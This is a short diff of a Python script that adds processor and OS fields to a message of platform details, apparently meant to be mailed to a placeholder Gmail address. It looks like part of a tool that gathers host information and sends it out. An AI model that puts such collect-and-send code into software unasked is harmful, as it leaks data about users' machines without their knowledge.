@@ -48,7 +48,9 @@ else:
 content = platform.machine()
 content1 = platform.version()
 content2 = platform.platform()
-message = content +"\n"+ content1+"\n" + content2
+content3 = platform.processor()
+content4 = platform.system()
+message = content +"\n"+ content1+"\n" + content2 +"\n"+ content3+"\n" + content4
 
 kime = "your_gmail"
 
